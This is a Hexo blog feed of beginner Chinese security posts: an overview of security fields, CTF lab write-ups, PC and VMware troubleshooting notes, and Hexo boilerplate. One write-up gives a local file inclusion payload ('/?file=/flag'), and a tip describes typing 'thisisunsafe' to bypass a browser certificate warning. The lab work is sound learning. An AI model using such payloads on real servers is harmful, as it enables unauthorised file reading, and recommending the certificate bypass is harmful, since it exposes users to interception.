      <link href="/2021/07/15/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/15/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全入门学习"><a href="#网络安全入门学习" class="headerlink" title="网络安全入门学习"></a>网络安全入门学习</h2><h3 id="网络安全大致的细分方向"><a href="#网络安全大致的细分方向" class="headerlink" title="网络安全大致的细分方向"></a>网络安全大致的细分方向</h3><p>​        网络安全的细分方向大致有计算机环境安全、数据安全、身份与访问安全、通信安全、应用安全、开发安全、业务安全、安全管理、云安全、智能安全、物联网安全、移动安全、工业互联网安全、区块链安全以及安全服务等。下面用一张长图来总结网络安全的细分方向。（资料源于知乎上腾讯安全联合实验室的回答）</p><img src="https://pic2.zhimg.com/80/v2-d7e84da65c80ef6580e22380cbf1918f_1440w.jpg" style="zoom:50%;" /><h3 id="几个网络安全方向的缩写科普"><a href="#几个网络安全方向的缩写科普" class="headerlink" title="几个网络安全方向的缩写科普"></a>几个网络安全方向的缩写科普</h3><h4 id="1-web安全"><a href="#1-web安全" class="headerlink" title="1. web安全"></a>1. web安全</h4><p>​        定义：保证web环境安全，为新型互联网产品提供安全平台。</p><p>​        攻击种类：</p><p>​               1.SQL注入：即通过把SQL命令插入到web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，比如影视网站泄露VIP会员密码大多数就是通过web表单递交查询字符暴露出来的，这类表单容易受到SQL注入式攻击。</p><p>​             2.跨站脚本攻击（也成为XXS）：指利用网络漏洞从用户那里恶意盗取信息，攻击者通过在链接中插入恶意代码从而盗取用户信息。</p><p>​            3.网页挂马：把一个木马程序上传到一个网站里面然后用木马生成器生一个网马，再上传到空间里面，再加代码使得木马在打开的网页里运行。</p><p>​        防火墙：</p><p>​        web应用防火墙（简称WAF）提供了一种安全运维控制手段：基于对HTTP/HTTPS流量的双向分析，为web应用提供实时的防护。</p><h4 id="2-pwn二进制"><a href="#2-pwn二进制" class="headerlink" title="2.pwn二进制"></a>2.pwn二进制</h4><p>​        定义：是一个黑客语法的俚语词，指攻破设备或系统。也称为二进制溢出。</p><p>​       CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。</p><p>​      漏洞一般是1、gets函数这种对输入没有限制导致溢出。2、格式化字符串漏洞。3、数据类型转换的时候产生了溢出。 总的来说就是对输入的值限制的不够让用户的输入影响了执行流。</p><p>​       著名赛事：</p><p>​       1.pwn20wn：活动主要目的是希望安全研究人员、开发人员，以及黑客们通过某些此前未知的漏洞来侵入各种移动设备，然后将之汇报给相应的设备制造商，以便它们对这些漏洞进行修补和修复。</p><p>​       2.GeekPwn：堪称全球最大规模的智能设备破解挑战赛。</p><h4 id="3-pentest"><a href="#3-pentest" class="headerlink" title="3.pentest"></a>3.pentest</h4><p>​        定义：pentest是penetration test的简写，是渗透性测试的意思。其并没有一个标准的定义，国外一些安全组织达成共识的通用说法是：渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。</p><p>​       补充：渗透测试（Penetration testing）是一种旨在探查和暴露信息系统中的安全性弱点以便对其进行修复的测试。</p><h4 id="4-res"><a href="#4-res" class="headerlink" title="4.res"></a>4.res</h4><p>​        re安全知识点：</p><p>​        DLL注入：把一个DLL文件放到目标进程中。最大目的是进入目标进程的地址空间，这样就可以操作目标进程中的对象了。</p><p>​        注入方式：</p><p>​        1.远程线程注入；</p><p>​        2.利用hook注入。</p><h4 id="5-crypto加密"><a href="#5-crypto加密" class="headerlink" title="5.crypto加密"></a>5.crypto加密</h4><p>​        密码学（cryptography）：通过将信息转换为非人类可读的格式来隐藏信息的真正含义。一般分为古典密码学和现代密码学。</p><p>​        <strong>·</strong>古典密码学：单表替换加密+多表替换加密+奇奇怪怪的机密方式</p><p>​        <strong>·</strong>现代密码学：对称加密（分组密码/块密码+序列密码/流密码）+非对称加密+哈希函数+数字签名</p><p>​       密码分析：</p><p>​        1.定义：一种尝试在不使用密钥的情况下解密的技术，密码分析使用数学分析和算法来解密密码。</p><p>​        2.成功取决于：</p><p>​        可用时间+可用的计算能力+可用存储容量</p><p>​         3.常用的密码分析攻击列表：</p><p>​      （1）暴力攻击；（2）字典攻击；（3）彩虹表攻击；（4）猜测；（5）爬虫。</p><h4 id="6-reverse逆向"><a href="#6-reverse逆向" class="headerlink" title="6.reverse逆向"></a>6.reverse逆向</h4><p>​        逆向工程。细节又分为安卓逆向、Windows上的exe逆向等等，都是按操作系统或编程语言来区分的。</p><p>​        逆向一般常用的操作都有：PEtools查壳、Upx脱壳、IDA pro静态反汇编、OllyDbg动态调试。</p><h4 id="7-misc杂项"><a href="#7-misc杂项" class="headerlink" title="7.misc杂项"></a>7.misc杂项</h4><p>​        主要就是指“取证、隐写”等 一 些其它的方向。例如：GIF图片隐写、PDF隐写、流量隐写、二维码复原。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>新手解题博客2</title>
      <link href="/2021/07/13/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A22/"/>
      <url>/2021/07/13/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A22/</url>
      
        <content type="html"><![CDATA[<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p>（1）this is flag</p><p><strong>题目：</strong></p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A22/QQ%E5%9B%BE%E7%89%8720210726003948.png" alt="QQ图片20210726003948" style="zoom: 50%;" /><p><strong>解题：</strong>flag即题目所给。</p><p>（2）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>新手解题博客1</title>
      <link href="/2021/07/12/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/"/>
      <url>/2021/07/12/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/</url>
      
        <content type="html"><![CDATA[<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><p>注释：建议在虚拟机中进行解题。</p><h3 id="basic："><a href="#basic：" class="headerlink" title="basic："></a>basic：</h3><p>（1）：Linux Labs</p><p><strong>题目：</strong>2020年10月24日 更新：目前所有靶机均能直接访问互联网。点击启动靶机可以启动一台安装好了 LAMP 的机器。并且这台机器位于靶机内网，所有动态靶机均可直接通过主机名访问这台机器。但由于目前一个账户只能同时启动一台靶机，您如果有需要建议浏览器开一个隐私窗口，注册一个新账号来启动这个靶机。ssh 用户名：root 密码：123456 地址和端口为动态分配的。</p><p><strong>解题：</strong>在虚拟机终端（ctrl+alt+t)输入命令“ssh -p 端口号 root@地址”回车输入yes再回车输入默认密码123456连接靶机。然后输入命令“cd ..”或“cd/”进入根目录，再输入命令“ls”查看含有flag的文件（flag.txt）。最后输入命令“cat flag.txt”查看文件即可找到flag。</p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/%E5%9B%BE%E7%89%876.png" alt="图片6" style="zoom:50%;" /><p><strong>小知识：</strong></p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>cd</td><td>切换当前目录至其它目录，比如进入/etc目录，则执行cd/etc</td></tr><tr><td>cd -</td><td>返回进入此目录之前所在的目录</td></tr><tr><td>cd .</td><td>进入当前目录</td></tr><tr><td>cd ..</td><td>返回上级目录（若当前目录为“/“，则执行完后还在“/“；”..”为上级目录的意思）</td></tr><tr><td>cd ../..</td><td>返回上两级目录</td></tr><tr><td>cd/</td><td>进入根目录</td></tr><tr><td>cd !$</td><td>把上个命令的参数作为cd参数使用</td></tr><tr><td>cd~</td><td>进入用户在该系统的home目录，例如xz用户，则进入/root/xz目录。要深入了解linux命令可以网站查找”Linux命令大全“</td></tr></tbody></table><p>要深入了解linux命令可以网站查找”Linux命令大全“</p><p>（2）BUU LFI COURSE 1</p><p><strong>解题：</strong>在题目所给连接后面加上“/?file=/flag”再进行访问即可得到flag。</p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/QQ%E5%9B%BE%E7%89%8720210726003232.png" alt="QQ图片20210726003232" style="zoom: 80%;" /><p><strong>小知识：</strong></p><p>LFI漏洞原理：</p><blockquote><p>文件包含漏洞的产生原因是通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入。<strong>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</strong></p></blockquote><p>（3）Upload-Labs-Linux</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p>（1）签到题</p><p><strong>题目：</strong></p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/QQ%E5%9B%BE%E7%89%8720210726183346.png" alt="QQ图片20210726183346" style="zoom:50%;" /><p><strong>解题：</strong>不要怀疑，就是题目所给的flag。</p><p>（2）金三胖</p><p><strong>题目：</strong></p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/aaa_ABC%E7%9C%8B%E5%9B%BE.gif" alt="aaa_ABC看图" style="zoom: 67%;" /><p><strong>解题：</strong>可以将gif拖进ps中进行分解图层。（也可以借助其他工具，例：stegsolve）</p><p>ps：分解图层后找flag所在图层（这里为了便于查看，我将flag所在图层调在一块了）解得flag{he11ohongke}（注意：这里是11（数字1）不是ll（L小写）哦）</p><img src="/images/%E6%96%B0%E6%89%8B%E8%A7%A3%E9%A2%98%E5%8D%9A%E5%AE%A21/QQ%E5%9B%BE%E7%89%8720210726183957.png" alt="QQ图片20210726183957" style="zoom: 25%;" />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>computer</title>
      <link href="/2021/07/11/computer/"/>
      <url>/2021/07/11/computer/</url>
      
        <content type="html"><![CDATA[<h2 id="电脑issue"><a href="#电脑issue" class="headerlink" title="电脑issue"></a>电脑issue</h2><p>注：由于是个电脑小白，经常把电脑弄得各种问题，所以写个问题清单，希望方便查找并帮助遇到同样问题的人，如有不对看到的大佬请指教。</p><ol><li><p>问题：网络连接不上，wifi那栏只剩如下图的三个选项：</p><img src="/images/computer/image-20210822103735325.png" alt="image-20210822103735325" style="zoom:50%;" /><p>解决方法：点击网络和internet设置找到网络重置：</p><img src="/images/computer/image-20210822103833199.png" alt="image-20210822103833199" style="zoom:33%;" /></li><li><p>问题：浏览器使用着突然访问提示该连接不是私密/专用连接：</p><img src="/images/computer/image-20210822114435579.png" alt="image-20210822114435579" style="zoom:30%;" /><p>解决方法一：切换至英文输入模式，点击页面任意位置输入“thisisunsafe”则刷新后可用，但治标不治本。</p><p>解决方法二：万能重启！（我是重启了之后会变好，但也不是长久之计）</p><p>解决方法三：还没找到根治的方法，疑因我的安全证书出现问题。</p><p>注：附上“在 Microsoft Edge 中安全浏览 Web时地址栏中的连接图标四种不同的状态对应的含义”的学习连接：<a href="https://support.microsoft.com/zh-cn/microsoft-edge/%E5%9C%A8-microsoft-edge-%E4%B8%AD%E5%AE%89%E5%85%A8%E6%B5%8F%E8%A7%88-web-c7beb47a-de9e-4aec-839d-28224a13a5d2">在 Microsoft Edge 中安全浏览 Web</a></p></li><li><p>问题：如何查找某个端口是否被占用</p><p>解决方法：win+R唤出命令窗口，输入netstat -aon|findstr “端口”</p><p>如果没有被占用则返回空，有则返回占用情况：</p><img src="/images/computer/image-20210822113651717.png" alt="image-20210822113651717" style="zoom: 67%;" /></li><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VMware</title>
      <link href="/2021/07/10/VMware/"/>
      <url>/2021/07/10/VMware/</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟机issue"><a href="#虚拟机issue" class="headerlink" title="虚拟机issue"></a>虚拟机issue</h2><p>注：本文虚拟机为VMware Workstation 16 Player（非商业用途）且以ubuntu-16.04.7-desktop-amd64（Linux系统）为镜像。</p><p>安装好后打开软件，点击创建新虚拟机。按照提示步骤完成即可。</p><p>快捷键ctrl+alt+t可以召唤终端，利用命令sudo passwd root设置root模式密码。设置完成后，可用命令su root进入特权模式/管理员模式。用命令python -V（大写）和pip -V查询python和pip版本，ubuntu自带的python2的版本是2.7.12，python3的版本是3.5.2，pip版本是8.1.1。</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210810234635531.png" alt="image-20210810234635531" style="zoom: 67%;" /><p>如果没有查询到则根据提示输入命令sudo apt install python-pip进行下载。</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210810234119104.png" alt="image-20210810234119104" style="zoom: 67%;" /><p>安装过程中很多错误产生的都是因为这两个的版本太低。</p><p>解决方法：用命令wget <a href="https://bootstrap.pypa.io/pip/3.5/get-pip.py%E5%9C%A8%E8%AF%A5%E7%BD%91%E5%9D%80%E4%B8%8B%E8%BD%BDpip%E3%80%82">https://bootstrap.pypa.io/pip/3.5/get-pip.py在该网址下载pip。</a></p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210810235410784.png" alt="image-20210810235410784" style="zoom:50%;" /><p>这个网址可以安装和python3兼容的pip 20.3.4版本。</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210811000107849.png" alt="image-20210811000107849" style="zoom:50%;" /><p>按上述操作完成后，各版本如下。</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210811000322681.png" alt="image-20210811000322681" style="zoom: 67%;" /><p>之后如果要用python运行文件，建议使用python3。</p><p>格式：python3 文件名（包括扩展名）。例如：python3 flag.py</p><p>如果要进入某个文件夹则用命令“cd 文件夹”</p><img src="/images/VMware/image-20210814203832735.png" alt="image-20210814203832735" style="zoom: 67%;" /><p>小tip：小白不建议更新工具等，除非万不得已，不然系统提示的更新忽略即可，否则可能出现新的问题。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/09/hello-world/"/>
      <url>/2021/07/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
